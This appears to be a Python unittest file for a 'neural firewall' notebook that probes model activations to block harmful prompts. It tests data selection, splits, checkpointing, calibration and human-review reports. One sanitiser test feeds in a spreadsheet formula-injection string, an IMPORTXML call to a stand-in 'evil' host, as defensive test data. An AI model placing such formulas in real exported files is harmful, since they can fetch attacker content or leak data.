"""Execute the notebook's actual helpers; no HF token, downloads, or Colab required.

Run: python3 -m unittest discover -s neuralFirewallV2/tests/unit -p 'test_nfw002_v2_notebook.py' -v
"""
import ast
import csv
import hashlib
import io
import json
import math
import os
import tempfile
import unittest
from collections import Counter, defaultdict
from contextlib import contextmanager
from pathlib import Path

import numpy as np
from sklearn.metrics import roc_auc_score
from sklearn.model_selection import GroupShuffleSplit


NOTEBOOK = Path(__file__).resolve().parents[2] / 'experiments/NFW-02_foundation_firewall/NFW_002_Foundational_Monitor_Block_POC_v2.ipynb'
NB = json.loads(NOTEBOOK.read_text())
CELLS = {c['id']: ''.join(c['source']) for c in NB['cells']}


def namespace(directory):
    ns = dict(globals())
    ns['RUN_DIR'] = Path(directory)
    for cell in ['helpers', 'response-helpers', 'report-helpers']:
        exec(compile(CELLS[cell], cell, 'exec'), ns)
    return ns


def raw_row(prompt='A prompt', source='original source', harmful=0, adversarial=0):
    return dict(prompt=prompt, source=source, language='en', prompt_harmful=harmful,
                prompt_adversarial=adversarial, prompt_type='test', category='test', attack_technique='')


class NotebookTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.ns = namespace(self.temp.name)
        self.cfg = dict(language='en', max_prompt_chars=100, max_sources=64, max_per_source_label_pair=2)

    def test_every_cell_compiles_and_no_saved_outputs(self):
        self.assertEqual(len(CELLS), len(NB['cells']))
        for c in NB['cells']:
            if c['cell_type'] == 'code':
                compile(''.join(c['source']), c['id'], 'exec')
                self.assertEqual(c['outputs'], [])
                self.assertIsNone(c['execution_count'])

    def test_per_row_labels_and_raw_metadata(self):
        raw = [raw_row('safe', 'same'), raw_row('unsafe', 'same', harmful=1),
               raw_row('attack', 'different', adversarial=1)]
        result = self.ns['select_rows'](raw, self.cfg)['records']
        got = {r['messages'][0]['content']:r for r in result}
        self.assertEqual([got[k]['intent_label'] for k in ['safe','unsafe','attack']], [0,1,1])
        self.assertEqual(got['attack']['prompt_harmful'], 0)
        self.assertEqual(got['attack']['prompt_adversarial'], 1)
        self.assertEqual(got['safe']['source'], 'same')
        self.assertNotIn('response_harmful', got['safe'])
        with self.assertRaises(ValueError):
            self.ns['select_rows']([raw_row(harmful=None)], self.cfg)

    def test_duplicate_ties_order_invariance_and_bounded_sample(self):
        raw = [raw_row(f'prompt {i}') for i in range(30)]
        raw += [dict(raw[0])] * 10  # the old helper crashed comparing heap dicts
        a = self.ns['select_rows'](raw, self.cfg)['records']
        b = self.ns['select_rows'](reversed(raw), self.cfg)['records']
        self.assertEqual(a, b)
        self.assertEqual(len(a), 2)

    def test_source_budget_is_bounded_without_abort_and_order_independent(self):
        raw = [raw_row(f'prompt {s}-{i}', f'source-{s}') for s in range(80) for i in range(4)]
        self.cfg['max_sources'] = 8
        a = self.ns['select_rows'](raw,self.cfg)
        b = self.ns['select_rows'](reversed(raw),self.cfg)
        self.assertEqual(a['records'],b['records'])
        self.assertEqual(a['selected_sources'],b['selected_sources'])
        self.assertEqual(len(a['records']),16)

    def test_cross_source_and_conflicting_duplicates_are_quarantined(self):
        raw = [raw_row(' A prompt ', source='A'), raw_row('a PROMPT', source='B'),
               raw_row('different'), raw_row('conflict', harmful=0), raw_row('conflict', harmful=1)]
        self.cfg['max_per_source_label_pair'] = 20
        result = self.ns['select_rows'](raw, self.cfg)
        self.assertEqual(len(result['records']), 1)
        self.assertEqual(result['counts']['excluded_sampled_duplicate_rows'], 4)

    def test_preserves_distinct_source_names_not_sanitized_collisions(self):
        rows = [raw_row('one', 'a/b'), raw_row('two', 'a_b')]
        selected = self.ns['select_rows'](rows, self.cfg)['records']
        self.assertEqual(len({r['group_id'] for r in selected}), 2)

    def test_source_disjoint_split_and_leakage_rejection(self):
        rows = [dict(id=f'{s}-{i}', group_id=f'source-{s}', intent_label=i%2)
                for s in range(12) for i in range(8)]
        split = self.ns['make_splits'](rows, 42, 2)
        self.ns['validate_splits'](split, rows, 2)
        split['final'].append(split['train'][0])
        with self.assertRaises(ValueError): self.ns['validate_splits'](split, rows, 2)

    def test_atomic_stage_roundtrip_binding_checksum_and_orphan(self):
        self.ns['save_stage']('data.json', {'a': 1}, 'binding')
        self.assertEqual(self.ns['load_stage']('data.json','binding'), {'a':1})
        with self.assertRaises(RuntimeError): self.ns['load_stage']('data.json', 'changed')
        self.ns['manifest'] = {'stages':{}}
        self.ns['mark_stage']('data','data.json')  # adoption after crash before manifest entry
        self.ns['mark_stage']('data','data.json')
        path = Path(self.temp.name)/'data.json'
        envelope = json.loads(path.read_text()); envelope['payload']['a'] = 2
        path.write_text(json.dumps(envelope))
        with self.assertRaises(RuntimeError): self.ns['load_stage']('data.json','binding')

    def test_threshold_finite_tied_scores_and_fpr(self):
        t, cal = self.ns['choose_threshold']([1.,1.,1.,1.], np.array([0,1,0,1]), 0.)
        self.assertTrue(math.isfinite(t)); self.assertGreater(t,1.)
        self.assertEqual(cal['fpr'],0.)
        self.ns['canonical']({'threshold':t})

    def test_real_logistic_fit_calibration_and_cached_monitor_reuse(self):
        import gc
        import types
        import torch
        from sklearn.linear_model import LogisticRegression
        ns = self.ns
        rows = [{'id':str(i),'intent_label':i%2} for i in range(20)]
        ns.update(gc=gc,torch=torch,LogisticRegression=LogisticRegression,REVIEW_ONLY=False,
                  CONFIG={'layers':[0,1],'seed':42,'target_fpr':0.02},
                  model=types.SimpleNamespace(config=types.SimpleNamespace(hidden_size=2)),
                  MODEL_BINDING='test-model',manifest={'stages':{}},
                  splits={name:rows for name in ['train','development','calibration']},
                  features_one=lambda row,layers:{l:np.array([float(row['intent_label'])*2-1,0.]) for l in layers})
        exec(compile(CELLS['fit'],'fit-monitor','exec'),ns)
        self.assertEqual(ns['probe']['calibration'],{'fpr':0.0,'tpr':1.0})
        ns['features_one']=lambda *args:self.fail('Recomputed cached features')
        exec(compile(CELLS['fit'],'resume-monitor','exec'),ns)

    def test_response_resume_skips_generation_and_rejects_monitor_change(self):
        row = dict(id='x',intent_label=0,source='s')
        r = dict(run_id='run',id='x',intent_label=0,source='s',condition='baseline',binding='frozen',
                 status='ok',released=True,text='hello')
        path = Path(self.temp.name)/'response.json'
        call = self.ns['response_checkpoint']
        call(path,row,'baseline','run','frozen',lambda:r)
        call(path,row,'baseline','run','frozen',lambda:self.fail('Regenerated completed record'))
        with self.assertRaises(RuntimeError): call(path,row,'baseline','run','changed',lambda:r)
        bad = dict(r, released=False)
        with self.assertRaises(ValueError): self.ns['validate_response'](bad,row,'baseline','run','frozen')

    def test_evaluation_key_includes_request_and_rubric(self):
        key = self.ns['evaluation_key']
        a = [{'role':'user','content':'A'}]; b = [{'role':'user','content':'B'}]
        self.assertEqual(key(a,'refusal','v1'),key(a,'refusal','v1'))
        self.assertNotEqual(key(a,'refusal','v1'),key(b,'refusal','v1'))
        self.assertNotEqual(key(a,'refusal','v1'),key(a,'refusal','v2'))

    def test_response_presentation_never_starts_with_formula(self):
        for text in ['=IMPORTXML("http://evil", "//x")', '\t=1+1', '+1', '-1', '@SUM(1)', 'ordinary']:
            self.assertEqual(self.ns['spreadsheet_text'](text), 'TEXT: '+text)

    def test_review_only_restores_completed_run_without_gpu_or_hf(self):
        import types
        ns = self.ns
        rows = [dict(id=f'{s}-{i}',group_id=f'source-{s}',source=f'source-{s}',intent_label=i,
                     messages=[dict(role='user',content=f'prompt {s}-{i}')]) for s in range(8) for i in (0,1)]
        split = ns['make_splits'](rows,42,1)
        data = {'records':rows,'splits':split}
        probe = {'threshold':0.}
        ns['manifest']={'run_id':'cpu-review','config':{'min_per_class_per_split':1},'execution':{'device_type':'cuda'},
                        'dataset_revision':'a'*40,'stages':{}}
        for stage, name, payload, binding in [
                ('dataset','dataset.json',data,'data-binding'),('splits','splits.json',split,'data-binding'),
                ('monitor','intent_monitor.json',probe,'model-binding')]:
            ns['save_stage'](name,payload,binding);ns['mark_stage'](stage,name)
        binding=ns['digest'](['model-binding',probe])
        responses=[{'run_id':'cpu-review','id':i,'condition':c,'binding':binding}
                   for i in split['final'] for c in ['baseline','firewall_block']]
        directory=Path(self.temp.name)
        ns['atomic_text'](directory/'target_model_responses.jsonl',''.join(json.dumps(r)+'\n' for r in responses))
        ns['mark_stage']('responses','target_model_responses.jsonl')
        (directory/'dataset_candidates.json').write_text('{}')
        ns.update(REVIEW_ONLY=True, RUN_ID='cpu-review', CONFIG=ns['manifest']['config'], DTYPE='cpu-unused',
                  importlib=types.SimpleNamespace(metadata=types.SimpleNamespace(version=lambda name:'local')),
                  get_token=lambda:None, HfApi=lambda **kwargs:None)
        exec(compile(CELLS['auth'],'review-only-auth','exec'),ns)
        self.assertEqual(ns['responses'],responses)
        for name in ['data','tokenizer-splits','model','fit','generate']:
            exec(compile(CELLS[name],name,'exec'),ns)  # every expensive stage must skip
        self.assertNotIn('model',ns)

    def test_review_pending_invalid_labels_and_request_binding(self):
        path = Path(self.temp.name)/'review.csv'
        expected = {'key': {'request_messages':'[]','response':'hello'}}
        fields = ['review_id','request_messages','response','harmful_assistance','task_success','reviewer']
        def write(harm='', task='', prompt='[]'):
            with path.open('w',newline='') as f:
                w=csv.DictWriter(f,fieldnames=fields); w.writeheader()
                w.writerow(dict(review_id='key',request_messages=prompt,response='hello',
                                harmful_assistance=harm,task_success=task,reviewer='human'))
        write(); self.assertEqual(self.ns['read_review'](path,expected)[1],['key'])
        write('0','1'); self.assertEqual(self.ns['read_review'](path,expected)[1],[])
        write('2','1')
        with self.assertRaises(ValueError): self.ns['read_review'](path,expected)
        write('0','1','changed')
        with self.assertRaises(RuntimeError): self.ns['read_review'](path,expected)

    def test_blocked_benign_counts_as_utility_failure_not_nan(self):
        rows = [dict(id='a',intent_label=0),dict(id='b',intent_label=1)]
        responses = []
        for row in rows:
            for c in ['baseline','firewall_block']:
                blocked=c=='firewall_block'
                responses.append(dict(id=row['id'],condition=c,released=not blocked,
                                      text='' if blocked else 'reply',status='blocked' if blocked else 'ok',monitor_margin=1.))
        labels={(i,'baseline'):dict(harmful_assistance=0,task_success=1) for i in ['a','b']}
        report=self.ns['summarize'](responses,rows,labels,0.)
        self.assertEqual(report['benign_task_success']['firewall_block']['rate'],0.)
        self.assertEqual(report['intent_confusion']['fp'],1)
        self.ns['canonical'](report)

    def test_identical_pair_disagreement_is_rejected(self):
        rows=[dict(id='a',intent_label=0)]
        rs=[dict(id='a',condition=c,released=True,text='same',status='ok',monitor_margin=-1.)
            for c in ['baseline','firewall_block']]
        labels={('a',c):dict(harmful_assistance=0,task_success=i)
                for i,c in enumerate(['baseline','firewall_block'])}
        with self.assertRaises(RuntimeError): self.ns['summarize'](rs,rows,labels,0.)

    def test_tiny_qwen_real_hooks_generation_and_full_report_pipeline(self):
        """Real randomly initialized tiny Qwen on CPU, NOT a pretrained safety result."""
        import gc
        import torch
        from transformers import Qwen2Config, Qwen2ForCausalLM, GenerationConfig
        cfg=Qwen2Config(vocab_size=32,hidden_size=16,intermediate_size=32,num_hidden_layers=4,
                       num_attention_heads=2,num_key_value_heads=2,max_position_embeddings=64,
                       eos_token_id=2,pad_token_id=0,bos_token_id=1)
        cfg._attn_implementation='eager'
        model=Qwen2ForCausalLM(cfg).eval().requires_grad_(False)
        class Tokenizer:
            def decode(self, values, skip_special_tokens=True): return 'tokens: '+str(values.tolist())
        ns=self.ns
        rows=[dict(id=f'test-{i}',source=f'source-{i}',intent_label=i%2,
                   messages=[dict(role='user',content=f'prompt {i}')]) for i in range(4)]
        ns.update(torch=torch,gc=gc,model=model,tokenizer=Tokenizer(),DEVICE=torch.device('cpu'),
                  CONFIG={'layers':[0,1],'max_input_tokens':16,'label_rubric':'test-rubric'},
                  token_ids=lambda r:[1,3,4,5],splits={'train':rows,'final':rows},
                  GENERATION=GenerationConfig(max_new_tokens=2,do_sample=False,pad_token_id=0,eos_token_id=2),
                  selected_layer=0,weight=np.zeros(16),bias=-1.,threshold=0.,
                  RUN_ID='test-run',RESPONSE_BINDING='test-binding',row_by_id={r['id']:r for r in rows},REVIEW_ONLY=False,
                  manifest={'stages':{}})
        tree=ast.parse(CELLS['model'])
        functions=ast.Module(body=[node for node in tree.body[0].body if isinstance(node,(ast.FunctionDef,ast.AsyncFunctionDef))],type_ignores=[])
        exec(compile(functions,'model-functions','exec'),ns)
        ns['verify_activation_site']()
        captured=ns['features_one'](rows[0],[0,1])
        self.assertEqual(captured[0].shape,(16,))
        self.assertFalse(model.model.layers[0]._forward_hooks)
        exec(compile(CELLS['generate'],'generate','exec'),ns)
        self.assertEqual(len(ns['responses']),8)
        # Re-run without model: all records MUST load from disk, not invoke generation.
        ns['model']=None
        exec(compile(CELLS['generate'],'generate-resumed','exec'),ns)
        exec(compile(CELLS['label-export'],'label-export','exec'),ns)
        exec(compile(CELLS['report'],'pending-report','exec'),ns)
        self.assertEqual(ns['report']['status'],'awaiting_labels')
        path=ns['review_path']
        with path.open(newline='') as f: review=list(csv.DictReader(f))
        for row in review: row.update(harmful_assistance='0',task_success='1',reviewer='test fixture')
        with path.open('w',newline='') as f:
            writer=csv.DictWriter(f,fieldnames=ns['fields']);writer.writeheader();writer.writerows(review)
        exec(compile(CELLS['report'],'complete-report','exec'),ns)
        self.assertEqual(ns['report']['status'],'complete_provisional')
        self.assertEqual(ns['report']['behavioral_metrics']['benign_task_success']['firewall_block']['rate'],1.)
        exec(compile(CELLS['report'],'complete-report-resume','exec'),ns)
        path.write_text(path.read_text().replace('test fixture','changed reviewer'))
        with self.assertRaises(RuntimeError): exec(compile(CELLS['report'],'reject-relabel','exec'),ns)


if __name__ == '__main__':
    unittest.main()
